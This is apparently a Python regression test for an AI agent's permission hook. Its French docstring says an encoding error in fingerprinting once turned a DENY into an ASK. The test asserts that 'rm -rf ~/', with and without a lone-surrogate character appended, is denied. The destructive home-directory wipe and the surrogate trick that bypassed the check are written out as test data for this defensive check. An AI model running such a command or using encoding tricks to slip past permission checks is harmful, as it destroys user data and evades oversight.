    """Revue W1-09 S3 : l'empreinte levait UnicodeEncodeError, le DENY devenait ASK."""
    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
    assert _pre(root, "Bash", {"command": "rm -rf ~/"}) is Outcome.DENY
    assert _pre(root, "Bash", {"command": "rm -rf ~/ \ud800"}) is Outcome.DENY
